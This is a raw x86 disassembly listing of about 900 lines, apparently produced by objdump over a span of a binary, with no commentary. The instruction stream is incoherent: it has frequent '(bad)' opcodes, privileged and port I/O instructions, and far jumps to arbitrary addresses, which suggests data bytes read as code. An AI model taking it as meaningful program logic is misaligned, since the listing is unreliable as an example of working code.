  415e5e:	adc    BYTE PTR ss:[ebx+0x6],dh
  415e62:	cs inc esi
  415e64:	mov    ax,ds:0xd5f1d891
  415e6a:	xor    eax,0x644fbc5a
  415e6f:	in     al,dx
  415e70:	aad    0x2a
  415e72:	mov    BYTE PTR [edx-0x143fc9d5],al
  415e78:	pop    ds
  415e79:	mov    ch,0xc8
  415e7b:	out    dx,al
  415e7c:	int3   
  415e7d:	push   0x4b
  415e7f:	sub    eax,DWORD PTR [ebx+eiz*2]
  415e82:	cmp    al,0x40
  415e84:	sbb    BYTE PTR [eax],bh
  415e86:	add    al,0xbc
  415e88:	scas   eax,DWORD PTR es:[edi]
  415e89:	pusha  
  415e8a:	mov    ebp,DWORD PTR [edx+0x66fd0922]
  415e90:	(bad)  
  415e91:	mov    al,0xe7
  415e93:	jecxz  0x415ee1
  415e95:	dec    esi
  415e96:	scas   al,BYTE PTR es:[edi]
  415e97:	push   edx
  415e98:	jecxz  0x415e2e
  415e9a:	repnz and al,0xfd
  415e9d:	fmul   QWORD PTR [edx+0x5c]
  415ea0:	ds push es
  415ea2:	sar    DWORD PTR [eax+0x340d2484],1
  415ea8:	iret   
  415ea9:	sub    DWORD PTR [edi+0x6d],esi
  415eac:	cld    
  415ead:	mov    ah,0x92
  415eaf:	jo     0x415ecb
  415eb1:	test   DWORD PTR [edx-0x6e],0x990aeeb5
  415eb8:	push   ebp
  415eba:	out    dx,eax
  415ebb:	ins    DWORD PTR es:[edi],dx
  415ebc:	rol    DWORD PTR [edx-0x8],cl
  415ebf:	loopne 0x415ed8
  415ec1:	inc    esi
  415ec2:	enter  0xe2e5,0xcc
  415ec6:	fdivp  st(1),st
  415ec8:	mov    ebp,0xa9ef5717
  415ecd:	sub    BYTE PTR [eax+0x5c2ac7a2],dl
  415ed3:	mov    ch,ah
  415ed5:	or     bl,cl
  415ed7:	mov    cs:0x7e893f67,al
  415edd:	push   ebp
  415ede:	psrad  mm2,QWORD PTR [edx-0x2958ffc8]
  415ee5:	les    edx,FWORD PTR [edi-0x3d6db5d7]
  415eeb:	fs call 0x8a268a3e
  415ef1:	leave  
  415ef2:	call   0x55c2:0xd2d456b0
  415ef9:	jmp    0x62bd:0x9a4e2fd0
  415f00:	sbb    bl,al
  415f02:	ss jo  0x415e89
  415f05:	jmp    0xa15d29e2
  415f0a:	push   ds
  415f0b:	sub    BYTE PTR [edi],bl
  415f0d:	mov    bl,0x6
  415f0f:	jne    0x415eb2
  415f11:	ficomp DWORD PTR [ecx*4-0x7c40495e]
  415f18:	cwde   
  415f19:	dec    esp
  415f1a:	xor    ecx,DWORD PTR [eax]
  415f1c:	mov    eax,DWORD PTR [ecx+0x4]
  415f1f:	inc    edi
  415f20:	xlat   BYTE PTR ds:[ebx]
  415f21:	enter  0xc7fd,0x3
  415f25:	test   eax,0xd8248af
  415f2a:	mov    eax,eax
  415f2c:	enter  0x7de,0x43
  415f30:	sbb    DWORD PTR [eax],ebp
  415f32:	sbb    BYTE PTR [ecx-0x6],ah
  415f35:	(bad)  
  415f36:	jnp    0x415ee7
  415f38:	jbe    0x415f22
  415f3a:	mov    al,0xb9
  415f3c:	push   esp
  415f3d:	je     0x415fac
  415f3f:	and    dl,BYTE PTR [ebp+0x78]
  415f42:	int    0x9e
  415f44:	sbb    dh,bh
  415f46:	mov    cl,0x80
  415f48:	ror    BYTE PTR [ebx-0x183a3f54],1
  415f4e:	mov    fs,WORD PTR [ecx]
  415f50:	xor    BYTE PTR [ebx],bh
  415f52:	outs   dx,BYTE PTR ds:[esi]
  415f53:	push   es
  415f54:	adc    DWORD PTR [edx],edi
  415f56:	dec    eax
  415f57:	daa    
  415f58:	pop    ebp
  415f59:	push   esp
  415f5a:	fidivr DWORD PTR [esi-0x42]
  415f5d:	xor    eax,0xbdc05b8d
  415f62:	sbb    esp,esp
  415f64:	into   
  415f65:	ins    DWORD PTR es:[edi],dx
  415f66:	sti    
  415f67:	test   eax,0xf36ed4f7
  415f6c:	repz xor al,0x69
  415f6f:	aad    0xbe
  415f71:	dec    eax
  415f72:	jbe    0x415fd3
  415f74:	out    0x2e,al
  415f76:	out    0x3b,eax
  415f78:	pop    eax
  415f79:	or     ch,BYTE PTR [edi-0x2b]
  415f7c:	retf   
  415f7d:	dec    esi
  415f7e:	xchg   esi,eax
  415f7f:	pop    edx
  415f80:	sub    al,0x45
  415f82:	inc    edi
  415f83:	fistp  WORD PTR [ecx+0x68]
  415f86:	(bad)  
  415f87:	xchg   edx,eax
  415f88:	or     eax,DWORD PTR [ecx+0x1c]
  415f8b:	inc    ebx
  415f8c:	sub    BYTE PTR [edi+esi*2-0x7],0x79
  415f91:	xor    edx,0x55
  415f94:	xlat   BYTE PTR ds:[ebx]
  415f95:	(bad)  
  415f96:	cmp    DWORD PTR [ebx+0x1f9e9954],edi
  415f9c:	and    eax,0x1551afbc
  415fa1:	inc    esi
  415fa2:	es out 0xb9,al
  415fa5:	stc    
  415fa6:	or     DWORD PTR [ebx],ebp
  415fa8:	lea    ebp,[esi]
  415faa:	jmp    DWORD PTR [eax+0xe625e6f]
  415fb0:	pop    es
  415fb1:	cmp    BYTE PTR [ecx-0x43],0x48
  415fb5:	aas    
  415fb6:	jmp    0x8889:0x736bb265
  415fbd:	mov    esp,0x5cb54b4
  415fc2:	sbb    BYTE PTR [ecx+0x13],dh
  415fc5:	lahf   
  415fc6:	push   ebp
  415fc7:	rol    bl,1
  415fc9:	(bad)  
  415fca:	add    eax,0x29dd8d3a
  415fcf:	push   eax
  415fd0:	dec    esi
  415fd1:	jns    0x415fcc
  415fd3:	aad    0xf5
  415fd5:	or     eax,0x9d6f4c4f
  415fda:	mov    eax,ds:0x692f26ac
  415fdf:	pop    esp
  415fe0:	jns    0x415fb0
  415fe2:	ins    BYTE PTR es:[edi],dx
  415fe3:	xlat   BYTE PTR ds:[ebx]
  415fe4:	in     al,0xdd
  415fe6:	int    0x4f
  415fe8:	jge    0x416014
  415fea:	test   BYTE PTR [edi+0x63],0x9
  415fee:	je     0x41600c
  415ff0:	or     BYTE PTR [eax+ebx*2-0x14],cl
  415ff4:	sbb    BYTE PTR [eax+0x33c3b5d6],dl
  415ffa:	mov    WORD PTR [ecx],ds
  415ffc:	and    edi,ebx
  415ffe:	stos   BYTE PTR es:[edi],al
  415fff:	repnz mov ch,0x90
  416002:	xchg   esi,eax
  416003:	mov    ah,0xa9
  416005:	jmp    0x416006
  416007:	into   
  416008:	mov    cs,esi
  41600a:	push   0x259b0353
  41600f:	sub    al,0xd6
  416011:	mov    eax,ds:0xf9810044
  416016:	sbb    al,0x8d
  416018:	push   ecx
  416019:	imul   ebx
  41601b:	mov    al,ds:0xd3540bc4
  416020:	inc    eax
  416021:	rol    BYTE PTR [eax+0x6f],1
  416024:	and    DWORD PTR [ebp+0x40],edi
  416027:	lahf   
  416028:	(bad)  
  416029:	jg     0x41609f
  41602b:	cld    
  41602c:	shl    ecx,cl
  41602e:	cs test al,0x2b
  416031:	mov    esp,0x1014618f
  416036:	xor    ebp,edx
  416038:	fs div bh
  41603b:	clc    
  41603c:	mov    ebx,0xbb048003
  416041:	(bad)  
  416042:	jne    0x415fec
  416044:	xchg   edi,eax
  416045:	ins    BYTE PTR es:[edi],dx
  416046:	inc    ebx
  416047:	jae    0x416073
  416049:	(bad)  
  41604a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41604b:	repz xor al,0xd9
  41604e:	out    0x4,al
  416050:	popa   
  416051:	and    eax,DWORD PTR [edx]
  416053:	add    BYTE PTR [edi],dl
  416055:	std    
  416056:	popa   
  416057:	test   BYTE PTR ss:[ebx-0xa],al
  41605b:	push   cs
  41605c:	fmul   st,st(7)
  41605e:	mov    ah,0x6d
  416060:	pusha  
  416061:	pop    edx
  416062:	rol    DWORD PTR [esi+eiz*2-0x11],1
  416066:	mov    edx,0x4603b6a8
  41606b:	xchg   edi,eax
  41606c:	mov    cl,0x9
  41606e:	cli    
  41606f:	sub    DWORD PTR [edi],eax
  416071:	adc    al,0x47
  416073:	ficom  DWORD PTR [ecx]
  416075:	pop    esi
  416076:	add    DWORD PTR [ecx],ebx
  416078:	ss inc eax
  41607a:	popa   
  41607b:	(bad)  
  41607c:	in     eax,0xd3
  41607e:	lahf   
  41607f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416081:	sub    BYTE PTR [ebx+0x51],cl
  416084:	in     eax,0xe4
  416086:	mov    BYTE PTR [ecx+eax*2+0xe],bh
  41608a:	call   0x7b35459e
  41608f:	pop    ds
  416090:	sub    BYTE PTR [esi],bl
  416092:	cli    
  416093:	fidiv  WORD PTR [ecx]
  416095:	clc    
  416096:	push   ds
  416097:	xor    al,0x3c
  416099:	xchg   ecx,eax
  41609a:	push   ebx
  41609b:	(bad)  
  41609c:	sti    
  41609d:	inc    eax
  41609e:	int3   
  41609f:	jae    0x41607e
  4160a1:	and    edi,DWORD PTR [edx-0x2]
  4160a4:	xor    al,0xf5
  4160a6:	imul   ecx,DWORD PTR [edx],0xffffffeb
  4160a9:	and    dl,BYTE PTR [ebp+0x7f]
  4160ac:	(bad)  
  4160ae:	jae    0x4160fd
  4160b0:	ja     0x4160ac
  4160b2:	mov    ebx,0xb36c72
  4160b7:	xchg   edx,eax
  4160b8:	arpl   WORD PTR ss:[esi],cx
  4160bb:	das    
  4160bc:	mov    ds:0xd4ba64f,al
  4160c1:	stos   DWORD PTR es:[edi],eax
  4160c2:	cdq    
  4160c3:	int3   
  4160c4:	hlt    
  4160c5:	das    
  4160c6:	adc    esi,DWORD PTR [esi+ebp*4+0x17]
  4160ca:	scas   eax,DWORD PTR es:[edi]
  4160cb:	shl    BYTE PTR [esi],cl
  4160cd:	mov    eax,0x20457207
  4160d2:	xchg   esp,eax
  4160d3:	mov    eax,ds:0xc3466951
  4160d8:	es sbb eax,0x906e5038
  4160de:	mov    BYTE PTR [di],0x6a
  4160e2:	cmovnp esp,DWORD PTR [ecx-0x7376108c]
  4160e9:	add    eax,0x85552451
  4160ee:	jno    0x416095
  4160f0:	dec    eax
  4160f1:	or     al,0x16
  4160f3:	push   ds
  4160f4:	pop    ss
  4160f5:	push   0x6a29e44a
  4160fa:	mov    es,WORD PTR [eax+0x43]
  4160fd:	sbb    al,0x5f
  4160ff:	dec    ebx
  416100:	(bad)  
  416101:	dec    ecx
  416102:	and    bl,BYTE PTR [edi-0x4e0106a1]
  416108:	pop    ebx
  416109:	inc    edx
  41610a:	stc    
  41610b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41610c:	sub    DWORD PTR [ebp+0x2514df6d],ebx
  416112:	jmp    0xd239:0x5ace82d6
  416119:	call   0x69d5:0xf681cbd0
  416120:	(bad)  
  416121:	cmp    edx,ebx
  416123:	sbb    cl,BYTE PTR [esi]
  416125:	call   0x2218:0xeb812db8
  41612c:	mov    ds:0xb6b639bc,eax
  416131:	push   ds
  416132:	fisttp WORD PTR [ebp+ebx*8+0x77]
  416136:	(bad)  
  416137:	gs ret 
  416139:	mov    esp,0x32bd40f2
  41613e:	and    BYTE PTR [ebx-0x20],dl
  416141:	jp     0x4160d8
  416143:	sub    al,0x2d
  416145:	into   
  416146:	fisttp QWORD PTR [edx+0x2034f69e]
  41614c:	sub    BYTE PTR [ebx],0x7c
  41614f:	or     ebp,DWORD PTR [eax]
  416151:	xor    al,0x15
  416153:	xchg   edi,eax
  416154:	mov    eax,ds:0x61985ee5
  416159:	scas   al,BYTE PTR es:[edi]
  41615a:	fxch   st(0)
  41615c:	shr    dl,cl
  41615e:	(bad)  
  41615f:	hlt    
  416160:	dec    edi
  416161:	pop    esp
  416162:	dec    edx
  416163:	ss pop ds
  416165:	xchg   BYTE PTR [eax+eiz*1-0xd],dl
  416169:	test   ebx,0xd71f0933
  41616f:	jmp    0x4161ae
  416171:	sub    ah,dh
  416173:	das    
  416174:	or     ah,al
  416176:	les    edi,FWORD PTR [edi+0x29]
  416179:	xlat   BYTE PTR ds:[ebx]
  41617a:	or     edx,DWORD PTR [ecx-0x68]
  41617d:	test   BYTE PTR [edi],bh
  41617f:	pop    edi
  416180:	inc    edx
  416181:	sahf   
  416182:	add    ebp,0xa38c487b
  416188:	bswap  edx
  41618a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41618b:	jecxz  0x416201
  41618d:	ins    DWORD PTR es:[edi],dx
  41618e:	xchg   DWORD PTR [eax-0x1e6417fd],ebx
  416194:	ins    BYTE PTR es:[edi],dx
  416195:	mov    cl,0xf0
  416197:	popa   
  416198:	test   BYTE PTR [ecx-0x19],bl
  41619b:	ficomp DWORD PTR [ebp-0x21da7240]
  4161a1:	inc    ecx
  4161a2:	(bad)  
  4161a3:	repnz into 
  4161a5:	aad    0xf4
  4161a7:	loop   0x416151
  4161a9:	lahf   
  4161aa:	stos   BYTE PTR es:[edi],al
  4161ab:	not    DWORD PTR [eax-0x51ad6060]
  4161b1:	or     cl,BYTE PTR [edi-0x3e2b29e2]
  4161b7:	xchg   edi,eax
  4161b8:	lea    edi,[ebx+0x2a]
  4161bb:	jmp    0x2063:0x20f840e2
  4161c2:	push   0x1868e5d3
  4161c7:	out    0xa6,eax
  4161c9:	xchg   BYTE PTR [ebx-0x5bd99372],ch
  4161cf:	cwde   
  4161d0:	adc    esi,edx
  4161d2:	sbb    edx,eax
  4161d4:	add    esi,DWORD PTR [ebp-0x3]
  4161d7:	imul   ebp,DWORD PTR [edi-0x7],0x7c
  4161db:	or     bh,BYTE PTR [eax+esi*8]
  4161de:	sub    BYTE PTR [edi+0x49e746ef],0xcd
  4161e5:	sysenter 
  4161e7:	stos   DWORD PTR es:[edi],eax
  4161e8:	jl     0x416225
  4161ea:	sbb    BYTE PTR [ebx],ch
  4161ec:	dec    esi
  4161ed:	aaa    
  4161ee:	(bad)  
  4161ef:	retf   
  4161f0:	jbe    0x416191
  4161f2:	test   eax,0xd408ee83
  4161f7:	test   DWORD PTR [edx+0x4fccbedf],ebx
  4161fd:	popf   
  4161fe:	xchg   edx,eax
  4161ff:	xor    BYTE PTR [esi+0x6a33cb31],ch
  416205:	fisub  DWORD PTR [ebp-0x4d]
  416208:	scas   eax,DWORD PTR es:[edi]
  416209:	jns    0x41621c
  41620b:	push   esi
  41620c:	imul   eax,DWORD PTR [ebp-0x58ad952a],0x5b
  416213:	(bad)  
  416214:	push   edi
  416215:	add    BYTE PTR [ebx-0xa],ch
  416218:	mov    edi,0xa34245df
  41621d:	out    0x54,eax
  41621f:	out    dx,al
  416220:	mov    edi,0xd227d67
  416225:	jns    0x416239
  416227:	sbb    BYTE PTR [ecx+edx*4+0x3f],0x1c
  41622c:	and    DWORD PTR [ebx+0x19091e9b],ecx
  416232:	mov    edx,0xc026da83
  416237:	xor    al,0xe1
  416239:	out    0xb0,al
  41623b:	leave  
  41623c:	ror    BYTE PTR [eax+edi*2+0x7faf0d06],cl
  416243:	int    0x95
  416245:	leave  
  416246:	popf   
  416247:	retf   
  416248:	xlat   BYTE PTR ds:[ebx]
  416249:	in     al,dx
  41624a:	xor    edx,DWORD PTR [edi+0x1f]
  41624d:	cmp    al,BYTE PTR [ebp-0x6c420064]
  416253:	addr16 dec esi
  416255:	in     al,0xf6
  416257:	rcl    DWORD PTR [esi],1
  416259:	int    0xa4
  41625b:	iret   
  41625c:	call   0x5619:0x8762a58a
  416263:	test   eax,0x26169936
  416268:	retf   
  416269:	sub    ebp,DWORD PTR [edi+0x16]
  41626c:	pusha  
  41626d:	adc    eax,0x155a3b9e
  416272:	enter  0xe6b0,0xf8
  416276:	pop    ss
  416277:	adc    eax,0xb21e5776
  41627c:	cmp    DWORD PTR [edx-0x35286636],esp
  416282:	outs   dx,BYTE PTR ds:[esi]
  416283:	mov    al,ds:0x7a31ef37
  416288:	test   DWORD PTR [esi+0x21],ebx
  41628b:	adc    eax,0x8c190ea9
  416290:	pop    ecx
  416291:	push   eax
  416292:	mov    eax,ds:0x258c07b6
  416297:	inc    ebx
  416298:	ss out 0xc5,al
  41629b:	ret    0x58d4
  41629e:	stc    
  41629f:	jecxz  0x416261
  4162a1:	mov    ds,edi
  4162a3:	jo     0x4162b1
  4162a5:	mov    esp,0xcb7f5aa3
  4162aa:	int    0x69
  4162ac:	mov    ebx,0xf04008ff
  4162b1:	test   al,0x45
  4162b3:	aas    
  4162b4:	xchg   ebp,eax
  4162b5:	inc    edx
  4162b6:	inc    ebp
  4162b7:	mov    esi,0xf429164f
  4162bc:	arpl   WORD PTR [edi+0x183c7a18],bx
  4162c2:	xlat   BYTE PTR ds:[ebx]
  4162c3:	jmp    0xbe252f9f
  4162c8:	inc    ecx
  4162c9:	mov    bh,0x60
  4162cb:	mov    dl,0xa9
  4162cd:	das    
  4162ce:	xchg   eax,esi
  4162d0:	mov    ds:0xd571429a,eax
  4162d5:	xchg   edi,eax
  4162d6:	fmul   QWORD PTR [eax+ecx*2-0x8185078]
  4162dd:	or     DWORD PTR [ecx],edx
  4162df:	pushf  
  4162e0:	aad    0x41
  4162e2:	sub    eax,0x4f9f9a98
  4162e7:	pop    esi
  4162e8:	out    0xf5,eax
  4162ea:	xchg   ebx,eax
  4162eb:	int3   
  4162ec:	sub    eax,0x8d3a526c
  4162f1:	scas   al,BYTE PTR es:[edi]
  4162f2:	mov    ah,0x5c
  4162f4:	inc    ecx
  4162f5:	adc    eax,0xca4783ad
  4162fa:	(bad)  
  4162fc:	jmp    0x4162ac
  4162fe:	mov    esp,0x3628c2c5
  416303:	and    eax,0xd686a1c3
  416308:	int    0xb3
  41630a:	inc    ebp
  41630b:	xchg   esi,eax
  41630c:	das    
  41630d:	fldenv [edx]
  41630f:	jge    0x4162dd
  416311:	mov    es,WORD PTR [ebx-0x6055894c]
  416317:	xchg   BYTE PTR [edi+eax*1],bl
  41631a:	ins    BYTE PTR es:[edi],dx
  41631b:	and    BYTE PTR [eax+0x7e],bl
  41631e:	adc    ebp,DWORD PTR [edi]
  416320:	mov    ah,0xbc
  416322:	inc    ebx
  416323:	rol    bh,1
  416325:	inc    ebp
  416326:	loopne 0x416361
  416328:	test   DWORD PTR [eax+edi*8-0x5d22ea75],ebx
  41632f:	inc    edx
  416330:	add    BYTE PTR [ecx],dh
  416332:	adc    eax,0x42a3bd
  416337:	jmp    0x416849
  41633c:	aas    
  41633d:	enter  0xc7c2,0xd1
  416341:	fxch   st(1)
  416343:	rcl    BYTE PTR [eax],1
  416345:	fistp  DWORD PTR [edi+0x45c213fe]
  41634b:	retf   
  41634c:	lock ret 
  41634e:	jg     0x4163c8
  416350:	jae    0x4163ce
  416352:	js     0x4163cc
  416354:	jbe    0x416370
  416356:	ins    DWORD PTR es:[edi],dx
  416357:	mov    esp,0x2cb5ed4d
  41635c:	and    al,0x4
  41635e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41635f:	dec    eax
  416360:	fs jle 0x416301
  416363:	inc    ebx
  416364:	ror    BYTE PTR [ebp-0x54e4bf14],0x46
  41636b:	sti    
  41636c:	mov    eax,ds:0xdd683567
  416371:	les    ebp,FWORD PTR [ecx]
  416373:	sub    DWORD PTR [edx],ebx
  416375:	mov    edi,0xb4046e4a
  41637a:	fwait
  41637b:	push   ecx
  41637c:	fiadd  WORD PTR [ebp+0x3ec11fef]
  416382:	dec    ebp
  416383:	sub    esp,DWORD PTR [edi+0x26a98644]
  416389:	pop    es
  41638a:	adc    eax,DWORD PTR [esi-0x7ea247e3]
  416390:	dec    ebp
  416391:	xchg   ebp,eax
  416392:	dec    eax
  416393:	adc    ebp,DWORD PTR [ecx-0x29]
  416396:	push   esi
  416397:	sub    al,0xf2
  416399:	adc    dl,BYTE PTR [esi]
  41639b:	add    al,0xf
  41639d:	icebp  
  41639e:	popf   
  41639f:	pop    ebx
  4163a0:	(bad)
  4163a3:	mov    ds:0x85eaa057,eax
  4163a8:	mov    ch,0xe7
  4163aa:	pop    esi
  4163ab:	repz lea eax,[ebx+0x21ce974d]
  4163b2:	xor    al,0x9b
  4163b4:	pusha  
  4163b5:	fcmovu st,st(3)
  4163b7:	add    DWORD PTR [edi],esi
  4163b9:	mov    WORD PTR [edi-0x18],ss
  4163bc:	inc    ebx
  4163bd:	addr16 jmp 0x5c190cb9
  4163c3:	push   0xffffff89
  4163c5:	pop    eax
  4163c6:	cdq    
  4163c7:	inc    esp
  4163c8:	mov    bl,0x12
  4163ca:	add    eax,0x7ea191f4
  4163cf:	mov    si,0xec4c
  4163d3:	sbb    ch,BYTE PTR [esi*8-0x1aa9f710]
  4163da:	loope  0x41643b
  4163dc:	(bad)  
  4163dd:	repz or dl,al
  4163e0:	fist   DWORD PTR [edi+edi*2+0x5579f2c3]
  4163e7:	cld    
  4163e8:	js     0x4163c4
  4163ea:	jmp    0xbd39:0x9e97ead9
  4163f1:	push   edi
  4163f2:	into   
  4163f3:	push   cs
  4163f4:	int3   
  4163f5:	mov    edi,0xc78b8a23
  4163fa:	sub    BYTE PTR [ecx-0x4818e43c],dh
  416400:	jbe    0x41645e
  416402:	xor    DWORD PTR [esi],eax
  416404:	xor    BYTE PTR [edx+eiz*2],cl
  416407:	not    BYTE PTR [ebp+0x3e284d19]
  41640d:	mov    edi,0x95775d56
  416412:	jg     0x4163c5
  416414:	xchg   ecx,eax
  416415:	jmp    0x18ae:0xc48fb9df
  41641c:	arpl   WORD PTR [esp+esi*1],cx
  41641f:	mov    ecx,0x609afc6c
  416424:	in     al,0x2a
  416426:	outs   dx,BYTE PTR ds:[esi]
  416427:	jmp    0x4163f0
  416429:	dec    eax
  41642a:	xor    eax,0x1b414954
  41642f:	push   eax
  416430:	loope  0x416404
  416432:	push   edi
  416433:	and    DWORD PTR [ecx-0x6292f1eb],esp
  416439:	in     eax,0xc6
  41643b:	cmp    DWORD PTR [ebx-0x9f5b470],0x10
  416442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416443:	mov    ch,0x6
  416445:	mov    esp,0x12a53401
  41644a:	dec    ebx
  41644b:	aas    
  41644c:	mov    al,0x82
  41644e:	and    ch,BYTE PTR [ebx+0x1308f9d1]
  416454:	mov    ebx,0xa14b5155
  416459:	fistp  DWORD PTR [esi+0x39]
  41645c:	mov    edx,0x9ca7e920
  416461:	xchg   DWORD PTR [ecx-0x36],edx
  416464:	sbb    esp,edx
  416466:	les    esp,FWORD PTR [ebx+0x12eaccaf]
  41646c:	mov    ds:0x28ed9c91,al
  416471:	(bad)  
  416472:	das    
  416473:	add    eax,0x3f2f5f2f
  416478:	or     eax,0xb203ae30
  41647d:	jle    0x4164fb
  41647f:	mov    eax,ds:0xd7c764b7
  416484:	cmp    edx,esi
  416486:	xor    eax,0xc19d1ce3
  41648b:	dec    edi
  41648c:	mov    ebx,0x9d3a6705
  416491:	data16 adc BYTE PTR [esi-0x4e],al
  416495:	inc    edi
  416496:	jecxz  0x416483
  416498:	sbb    esp,ebx
  41649a:	fadd   QWORD PTR [eax-0x787c5335]
  4164a0:	repz je 0x4164fc
  4164a3:	scas   al,BYTE PTR es:[edi]
  4164a4:	mov    BYTE PTR [edx],cl
  4164a6:	and    ebx,DWORD PTR [ebp+0x2a974b50]
  4164ac:	mov    dl,0x14
  4164ae:	xchg   ebp,eax
  4164af:	add    DWORD PTR [ebp+0x7e],ecx
  4164b2:	sbb    al,0xae
  4164b4:	xchg   esi,eax
  4164b5:	cli    
  4164b6:	loopne 0x41646b
  4164b8:	fld    DWORD PTR [esi+0x74e0872f]
  4164be:	sti    
  4164bf:	dec    ecx
  4164c0:	loope  0x416481
  4164c2:	cwde   
  4164c3:	in     eax,dx
  4164c4:	jmp    0x9582:0x9f73a3f9
  4164cb:	mov    esi,0x11901707
  4164d0:	retf   
  4164d1:	ss leave 
  4164d3:	rol    BYTE PTR [eax-0x586a8ed6],1
  4164d9:	(bad)  
  4164da:	dec    esi
  4164db:	fst    st(6)
  4164dd:	jecxz  0x41646c
  4164df:	mov    edi,0xd4e3fc91
  4164e4:	(bad)
  4164e8:	retf   
  4164e9:	jp     0x4164c9
  4164eb:	ret    0xe40e
  4164ee:	cmp    ch,al
  4164f0:	push   0xffffff9b
  4164f2:	push   esi
  4164f3:	sbb    al,0xd3
  4164f5:	js     0x416499
  4164f7:	add    ch,BYTE PTR [edx+eiz*2]
  4164fa:	inc    edi
  4164fb:	call   0xc7e7782f
  416500:	inc    ebp
  416501:	outs   dx,BYTE PTR ds:[esi]
  416502:	cli    
  416503:	inc    ebp
  416504:	shl    ecx,0x7d
  416507:	fnsave [esi+0xbd703fa]
  41650d:	int3   
  41650e:	popa   
  41650f:	jg     0x41653f
  416511:	xchg   ah,ch
  416513:	in     al,dx
  416514:	mov    ebp,0x26115600
  416519:	neg    DWORD PTR [ebp+0x1e30ec5]
  41651f:	call   DWORD PTR [edx+0x1dbc4f00]
  416525:	(bad)  
  416526:	sbb    eax,0x41966664
  41652b:	xor    BYTE PTR [ebx+0x7a],bl
  41652e:	pop    ds
  41652f:	icebp  
  416530:	add    ecx,DWORD PTR [ebx]
  416532:	mov    dh,0x74
  416534:	sbb    eax,0x4437819e
  416539:	addr16 pushf 
  41653b:	xchg   DWORD PTR [ebx+0x3fd3680a],edx
  416541:	mov    dh,0x9a
  416543:	cmp    ah,BYTE PTR [edx-0x4a2490f1]
  416549:	fneni(8087 only) 
  41654b:	into   
  41654c:	sbb    bl,ch
  41654e:	imul   ebp,DWORD PTR [edx],0xfffffff8
  416551:	push   edx
  416552:	leave  
  416553:	cmp    al,0xda
  416555:	imul   esp,DWORD PTR ds:0xdf6166a2,0x496c99ca
  41655f:	dec    edi
  416560:	je     0x4165a6
  416562:	push   ebp
  416563:	sub    bl,BYTE PTR [ebx]
  416565:	aas    
  416566:	xchg   ecx,eax
  416567:	mov    cl,BYTE PTR [esi-0x49]
  41656a:	imul   ecx,DWORD PTR [ebp-0x55],0xffffff9e
  41656e:	data16 cmp al,0xa8
  416571:	dec    eax
  416572:	retf   
  416573:	lds    edi,FWORD PTR [esi]
  416575:	sar    DWORD PTR [edi],cl
  416577:	pop    esp
  416578:	imul   ebp,ebp,0xe80423df
  41657e:	enter  0x3593,0x5a
  416582:	mov    DWORD PTR [esi+0x3a32fb9f],esp
  416588:	jl     0x4165bf
  41658a:	push   es
  41658b:	ja     0x416526
  41658d:	daa    
  41658e:	out    dx,al
  41658f:	pushf  
  416590:	push   esi
  416591:	inc    ebp
  416592:	push   cs
  416593:	in     eax,dx
  416594:	clc    
  416595:	mov    ebx,0x26eb94da
  41659a:	mov    ebp,0x666d27bb
  41659f:	or     ah,cl
  4165a1:	jmp    0x975416c3
  4165a6:	imul   edi,ebx,0xa3956b82
  4165ac:	jl     0x416564
  4165ae:	push   ebp
  4165af:	or     edi,DWORD PTR [esi-0x23e131ba]
  4165b5:	das    
  4165b6:	sar    DWORD PTR es:[esp+edi*8-0x4354bf5a],0x29
  4165bf:	fsubr  QWORD PTR [edx]
  4165c1:	outs   dx,BYTE PTR ds:[esi]
  4165c2:	jno    0x4165ce
  4165c4:	cwde   
  4165c5:	mov    bl,0x65
  4165c7:	sub    ah,cl
  4165c9:	fadd   DWORD PTR [edx-0x3]
  4165cc:	ds out dx,al
  4165ce:	pop    ss
  4165cf:	push   esi
  4165d0:	jns    0x41662d
  4165d2:	cs xor eax,0xa2834f4e
  4165d8:	mov    bh,ah
  4165da:	xchg   esi,eax
  4165db:	cmp    dh,BYTE PTR [edx-0x4953f795]
  4165e1:	xchg   esi,eax
  4165e2:	ins    DWORD PTR es:[edi],dx
  4165e3:	ins    DWORD PTR es:[edi],dx
  4165e4:	mov    ch,BYTE PTR [esi]
  4165e6:	js     0x416576
  4165e8:	inc    eax
  4165e9:	jae    0x416612
  4165eb:	mov    ds:0x56449427,eax
  4165f0:	js     0x4165ac
  4165f2:	int    0x52
  4165f4:	inc    ebp
  4165f5:	dec    eax
  4165f6:	adc    DWORD PTR [esi],edi
  4165f8:	inc    cl
  4165fa:	std    
  4165fb:	data16 into 
  4165fd:	nop
  4165fe:	mov    eax,ds:0x56f7e9b1
  416603:	imul   esi,DWORD PTR [ecx+0x2b],0x23
  416607:	dec    eax
  416608:	repz and BYTE PTR [ebx],cl
  41660b:	xchg   DWORD PTR [ecx-0x1d],ecx
  41660e:	lea    eax,[ecx-0x6f]
  416611:	mov    edx,0x9a364ba5
  416616:	jns    0x416688
  416618:	xchg   DWORD PTR [ecx-0x19360b07],edi
  41661e:	imul   ebx,DWORD PTR [edi],0xffffffde
  416621:	xchg   ebx,eax
  416622:	cmp    DWORD PTR [edx-0x1e7949b],ebp
  416628:	lock sub eax,0x6a6aedfe
  41662e:	pop    ds
  41662f:	mov    dh,0xec
  416631:	xchg   BYTE PTR [eax-0x4],bh
  416634:	jmp    0x416651
  416636:	je     0x4165ec
  416638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416639:	cdq    
  41663a:	mov    al,ds:0x224f6577
  41663f:	push   ebx
  416640:	rol    DWORD PTR [ecx+0x24f42031],0x40
  416647:	xchg   esi,eax
  416648:	mov    ebp,0x9ee893bc
  41664d:	adc    eax,0x16f2c874
  416652:	sti    
  416653:	clc    
  416654:	and    eax,0xee33a7a6
  416659:	cmp    esi,DWORD PTR [edx-0x2ca46cb4]
  41665f:	cmp    DWORD PTR [edi+ecx*2-0x163ff7c2],esi
  416666:	xchg   BYTE PTR [ecx+ebp*2-0x4130cf29],al
  41666d:	aaa    
  41666e:	cmp    al,BYTE PTR [esi-0x60]
  416671:	pushf  
  416672:	daa    
  416673:	mov    ds:0x6330439c,eax
  416678:	mov    BYTE PTR [edi],ch
  41667a:	int    0xed
  41667c:	jl     0x4166f5
  41667e:	jne    0x416617
  416680:	add    bl,ah
